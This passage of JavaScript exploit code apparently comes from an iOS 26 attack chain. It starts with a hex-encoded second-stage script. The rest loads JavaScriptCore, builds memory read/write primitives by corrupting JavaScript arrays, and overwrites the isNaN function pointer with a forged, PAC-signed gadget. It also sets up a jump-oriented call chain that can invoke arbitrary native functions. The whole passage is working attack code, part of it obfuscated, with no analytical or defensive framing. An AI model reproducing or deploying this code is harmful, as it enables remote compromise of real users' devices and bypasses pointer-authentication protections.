        0x31, 0x78, 0x33, 0x78, 0x38, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28,
        0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66,
        0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e,
        0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x31, 0x34, 0x5f, 0x61,
        0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x5f, 0x78, 0x38, 0x20, 0x3d, 0x20, 0x75,
        0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73,
        0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78,
        0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64,
        0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76,
        0x6d, 0x5f, 0x69, 0x73, 0x4e, 0x41, 0x4e, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x67, 0x61,
        0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66,
        0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66,
        0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29,
        0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b,
        0x0a, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x69, 0x73, 0x4e, 0x41, 0x4e, 0x5f,
        0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x32, 0x20, 0x3d, 0x20,
        0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66,
        0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64,
        0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69,
        0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x78, 0x70,
        0x61, 0x63, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61,
        0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73,
        0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20,
        0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b,
        0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x73, 0x74, 0x61, 0x67, 0x65, 0x31,
        0x5f, 0x6a, 0x73, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x6a, 0x73,
        0x5f, 0x69, 0x6e, 0x70, 0x75, 0x74, 0x73, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x30, 0x30, 0x6e, 0x29,
        0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f,
        0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x22, 0x22, 0x3b, 0x0a, 0x20, 0x20,
        0x20, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x28, 0x6c, 0x65, 0x74, 0x20, 0x69, 0x20, 0x3d, 0x20, 0x30,
        0x6e, 0x3b, 0x20, 0x69, 0x20, 0x3c, 0x20, 0x30, 0x78, 0x35, 0x30, 0x6e, 0x3b, 0x20, 0x69, 0x20,
        0x2b, 0x3d, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20,
        0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x3d,
        0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63,
        0x61, 0x6c, 0x6c, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x20, 0x2b, 0x20, 0x69, 0x29, 0x2e, 0x68, 0x65,
        0x78, 0x50, 0x6c, 0x61, 0x69, 0x6e, 0x28, 0x29, 0x20, 0x2b, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c,
        0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x7d, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77,
        0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x28,
        0x22, 0x30, 0x78, 0x22, 0x20, 0x2b, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x77, 0x72, 0x61,
        0x70, 0x70, 0x65, 0x72, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x61, 0x64, 0x64, 0x72, 0x6f,
        0x66, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61,
        0x70, 0x70, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x62, 0x69, 0x67, 0x69, 0x6e,
        0x74, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x28, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67,
        0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20,
        0x53, 0x59, 0x53, 0x4c, 0x4f, 0x47, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x72, 0x65,
        0x73, 0x6f, 0x6c, 0x76, 0x65, 0x28, 0x22, 0x73, 0x79, 0x73, 0x6c, 0x6f, 0x67, 0x22, 0x29, 0x3b,
        0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x3d, 0x20,
        0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x63, 0x2c, 0x20, 0x2e, 0x2e,
        0x2e, 0x61, 0x72, 0x67, 0x73, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x75, 0x77, 0x72,
        0x69, 0x74, 0x65, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c,
        0x5f, 0x70, 0x63, 0x2c, 0x20, 0x70, 0x63, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x66, 0x6f,
        0x72, 0x20, 0x28, 0x6c, 0x65, 0x74, 0x20, 0x69, 0x64, 0x78, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b,
        0x20, 0x69, 0x64, 0x78, 0x20, 0x3c, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x28, 0x61, 0x72,
        0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x2e, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x20, 0x2d,
        0x20, 0x31, 0x29, 0x3b, 0x20, 0x69, 0x64, 0x78, 0x2b, 0x2b, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20,
        0x20, 0x20, 0x20, 0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76,
        0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x20, 0x2b, 0x20, 0x69,
        0x64, 0x78, 0x20, 0x2a, 0x20, 0x38, 0x6e, 0x2c, 0x20, 0x61, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e,
        0x74, 0x73, 0x5b, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x20, 0x31, 0x6e, 0x5d, 0x29, 0x3b, 0x0a, 0x20,
        0x20, 0x20, 0x20, 0x7d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x73, 0x4e, 0x61, 0x4e, 0x28, 0x66,
        0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65,
        0x72, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75,
        0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x5f, 0x66, 0x63,
        0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72,
        0x20, 0x2b, 0x20, 0x30, 0x78, 0x32, 0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a,
        0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x77, 0x69, 0x74, 0x68, 0x5f, 0x70, 0x61, 0x63,
        0x69, 0x61, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70,
        0x63, 0x2c, 0x20, 0x2e, 0x2e, 0x2e, 0x61, 0x72, 0x67, 0x73, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20,
        0x20, 0x20, 0x70, 0x63, 0x20, 0x3d, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x28, 0x70, 0x63, 0x2e,
        0x6e, 0x6f, 0x50, 0x41, 0x43, 0x28, 0x29, 0x2c, 0x20, 0x30, 0x78, 0x63, 0x32, 0x64, 0x30, 0x6e,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x28,
        0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x70, 0x63, 0x2c, 0x20, 0x70,
        0x63, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x28, 0x6c, 0x65, 0x74,
        0x20, 0x69, 0x64, 0x78, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x3c,
        0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x28, 0x61, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74,
        0x73, 0x2e, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x20, 0x2d, 0x20, 0x31, 0x29, 0x3b, 0x20, 0x69,
        0x64, 0x78, 0x2b, 0x2b, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x77,
        0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x28, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c,
        0x6c, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x38,
        0x6e, 0x2c, 0x20, 0x61, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73, 0x5b, 0x69, 0x64, 0x78,
        0x20, 0x2b, 0x20, 0x31, 0x6e, 0x5d, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x7d, 0x0a, 0x20,
        0x20, 0x20, 0x20, 0x69, 0x73, 0x4e, 0x61, 0x4e, 0x28, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61,
        0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x29, 0x3b, 0x0a, 0x20, 0x20,
        0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34,
        0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61, 0x72,
        0x67, 0x73, 0x5f, 0x77, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x32,
        0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x66, 0x75, 0x6e, 0x63,
        0x5f, 0x72, 0x65, 0x73, 0x6f, 0x6c, 0x76, 0x65, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74,
        0x69, 0x6f, 0x6e, 0x20, 0x28, 0x73, 0x79, 0x6d, 0x62, 0x6f, 0x6c, 0x29, 0x20, 0x7b, 0x0a, 0x20,
        0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x66, 0x70, 0x74, 0x72, 0x20, 0x3d, 0x20, 0x66, 0x63,
        0x61, 0x6c, 0x6c, 0x28, 0x44, 0x4c, 0x53, 0x59, 0x4d, 0x2c, 0x20, 0x30, 0x78, 0x46, 0x46, 0x46,
        0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x45, 0x6e, 0x2c, 0x20,
        0x67, 0x65, 0x74, 0x5f, 0x63, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x28, 0x73, 0x79, 0x6d, 0x62,
        0x6f, 0x6c, 0x29, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e,
        0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x28, 0x66, 0x70, 0x74, 0x72, 0x2e, 0x6e, 0x6f, 0x50, 0x41,
        0x43, 0x28, 0x29, 0x2c, 0x20, 0x30, 0x78, 0x63, 0x32, 0x64, 0x30, 0x6e, 0x29, 0x3b, 0x0a, 0x20,
        0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x5f, 0x62, 0x5f, 0x69, 0x6e,
        0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f,
        0x6e, 0x20, 0x28, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x2c, 0x20, 0x6b, 0x65, 0x79,
        0x5f, 0x74, 0x79, 0x70, 0x65, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74,
        0x20, 0x75, 0x73, 0x65, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x5f, 0x64, 0x69, 0x76, 0x65, 0x72, 0x73,
        0x69, 0x74, 0x79, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65,
        0x74, 0x20, 0x61, 0x64, 0x64, 0x72, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20,
        0x20, 0x69, 0x66, 0x20, 0x28, 0x63, 0x74, 0x78, 0x20, 0x3e, 0x3e, 0x20, 0x31, 0x36, 0x6e, 0x20,
        0x21, 0x3d, 0x20, 0x30, 0x6e, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75,
        0x73, 0x65, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x5f, 0x64, 0x69, 0x76, 0x65, 0x72, 0x73, 0x69, 0x74,
        0x79, 0x20, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x61, 0x64,
        0x64, 0x72, 0x20, 0x3d, 0x20, 0x63, 0x74, 0x78, 0x20, 0x26, 0x20, 0x30, 0x78, 0x46, 0x46, 0x46,
        0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20,
        0x20, 0x20, 0x63, 0x74, 0x78, 0x20, 0x3d, 0x20, 0x63, 0x74, 0x78, 0x20, 0x3e, 0x3e, 0x20, 0x34,
        0x38, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x7d, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65,
        0x74, 0x75, 0x72, 0x6e, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x28, 0x64, 0x79, 0x6c, 0x64, 0x5f,
        0x73, 0x69, 0x67, 0x6e, 0x50, 0x6f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x5f, 0x67, 0x61, 0x64, 0x67,
        0x65, 0x74, 0x2c, 0x20, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x61, 0x64, 0x64, 0x72, 0x2c, 0x20, 0x75,
        0x73, 0x65, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x5f, 0x64, 0x69, 0x76, 0x65, 0x72, 0x73, 0x69, 0x74,
        0x79, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x2c, 0x20, 0x6b, 0x65, 0x79, 0x5f, 0x74, 0x79, 0x70, 0x65,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x20,
        0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x74, 0x72, 0x2c,
        0x20, 0x63, 0x74, 0x78, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75,
        0x72, 0x6e, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x5f, 0x62, 0x5f, 0x69, 0x6e, 0x74, 0x65, 0x72,
        0x6e, 0x61, 0x6c, 0x28, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x2c, 0x20, 0x30, 0x6e,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x62, 0x20,
        0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x74, 0x72, 0x2c,
        0x20, 0x63, 0x74, 0x78, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75,
        0x72, 0x6e, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x5f, 0x62, 0x5f, 0x69, 0x6e, 0x74, 0x65, 0x72,
        0x6e, 0x61, 0x6c, 0x28, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x2c, 0x20, 0x31, 0x6e,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x78, 0x70, 0x61, 0x63, 0x20, 0x3d,
        0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x74, 0x72, 0x29, 0x20,
        0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x78, 0x70, 0x61, 0x63, 0x5f, 0x67,
        0x61, 0x64, 0x67, 0x65, 0x74, 0x5f, 0x6e, 0x65, 0x77, 0x20, 0x3d, 0x20, 0x70, 0x61, 0x63, 0x69,
        0x61, 0x28, 0x78, 0x70, 0x61, 0x63, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x2c, 0x30, 0x78,
        0x63, 0x32, 0x64, 0x30, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75,
        0x72, 0x6e, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x28, 0x78, 0x70, 0x61, 0x63, 0x5f, 0x67, 0x61,
        0x64, 0x67, 0x65, 0x74, 0x5f, 0x6e, 0x65, 0x77, 0x2c, 0x20, 0x70, 0x74, 0x72, 0x29, 0x3b, 0x0a,
        0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x4c, 0x4f, 0x47, 0x5f, 0x43, 0x53, 0x54, 0x52, 0x49,
        0x4e, 0x47, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x73,
        0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x28, 0x53, 0x59,
        0x53, 0x4c, 0x4f, 0x47, 0x2c, 0x20, 0x30, 0x6e, 0x2c, 0x20, 0x73, 0x29, 0x3b, 0x0a, 0x20, 0x20,
        0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x4c, 0x4f, 0x47, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74,
        0x69, 0x6f, 0x6e, 0x20, 0x28, 0x73, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x66,
        0x20, 0x28, 0x73, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74,
        0x20, 0x6d, 0x73, 0x67, 0x20, 0x3d, 0x20, 0x73, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
        0x5b, 0x5d, 0x5b, 0x6d, 0x73, 0x67, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x72,
        0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x4c, 0x4f, 0x47, 0x5f, 0x43, 0x53, 0x54, 0x52, 0x49, 0x4e,
        0x47, 0x28, 0x67, 0x65, 0x74, 0x5f, 0x63, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x28, 0x6d, 0x73,
        0x67, 0x29, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x7d, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a,
        0x7d, 0x29, 0x28, 0x29, 0x3b, 0x00,
      ]);
      pe_stage1_js_data = gpuCopyBuffer(read64(addrof(pe_stage1_js_data_array) + 0x10n), BigInt(pe_stage1_js_data_array.length));
      pe_main_js_data = get_cstring(getJS('pe_main_26.js'));
    } else {
      pe_stage1_js_data = g_pe_stage1_js_data;
      pe_main_js_data = g_pe_main_js_data;
      pe_post_js_data = g_pe_post_js_data;
    }
    let pe_stage_1_cfstring = mpd_create_cfstring(pe_stage1_js_data);
    let pe_main_cfstring = mpd_create_cfstring(pe_main_js_data);
    let arr = mpd_setup_fcall_jopchain();
    let jsvm_fcall_buff = arr[0];
    let jsvm_fcall_pc = arr[1];
    let jsvm_fcall_args = arr[2];
    mpd_fcall(DLOPEN, mpd_get_cstring("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"), 2n);
    let mpd_jsc_class = mpd_objc_getClass(mpd_get_cstring("JSContext"));
    let ctx = mpd_objc_alloc_init(mpd_jsc_class);
    let isnan_value = mpd_objectForKeyedSubscript(ctx, "isNaN");
    let isnan_func_addr = mpd_read64(isnan_value + 0x8n);
    let isnan_executable_addr = mpd_read64(isnan_func_addr + 0x18n);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    mpd_evaluateScript(ctx, pe_stage_1_cfstring);
    let unboxed_arr_value = mpd_objectForKeyedSubscript(ctx, "unboxed_arr");
    let unboxed_arr_addr = mpd_read64(unboxed_arr_value + 0x8n);
    let boxed_arr_value = mpd_objectForKeyedSubscript(ctx, "boxed_arr");
    let boxed_arr_addr = mpd_read64(boxed_arr_value + 0x8n);
    let boxed_arr_buffer = mpd_read64(boxed_arr_addr + 0x8n);
    mpd_write64(unboxed_arr_addr + 0x8n, boxed_arr_buffer);
    let rw_array_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array") + 0x8n);
    let control_array_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array") + 0x8n);
    mpd_write64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array_8") + 0x8n);
    let control_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array_8") + 0x8n);
    mpd_write64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    let signing_ctx = 0x4911n;
    let signed_fcall_addr = mpd_pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    LOG(`[MPD iOS26] signed_fcall_addr: ${signed_fcall_addr.hex()}`);
    LOG(`[MPD iOS26] isnan_code_ptr: ${isnan_code_ptr.hex()}`);
    mpd_write64(isnan_code_ptr, signed_fcall_addr);
    let new_func_offsets = mpd_objectForKeyedSubscript(ctx, "func_offsets_array");
    let new_func_offsets_addr = mpd_read64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = mpd_read64(new_func_offsets_addr + 0x10n);
    let DLSYM = func_resolve("dlsym").noPAC();
    let idx = 0n;
    let js_inputs = mpd_malloc(0x100n);
    mpd_write64(js_inputs, pe_stage_1_cfstring);
    mpd_write64(js_inputs + 0x8n, 0n);
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, pacia(DLSYM.noPAC(), 0xc2d0n));
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, pacia(dyld_signPointer_gadget.noPAC(), 0xc2d0n));
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, js_inputs);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, 0n);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, shared_cache_slide);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_buff);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_pc);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_args);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, _CFObjectCopyProperty);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, load_x1x3x8);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, fcall_14_args_write_x8);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_isNAN_fcall_gadget);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_isNAN_fcall_gadget2);
    idx += 0x1n;
    LOG(`xpac_gadget:${xpac_gadget.hex()}`);
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, xpac_gadget);
    idx += 0x1n;
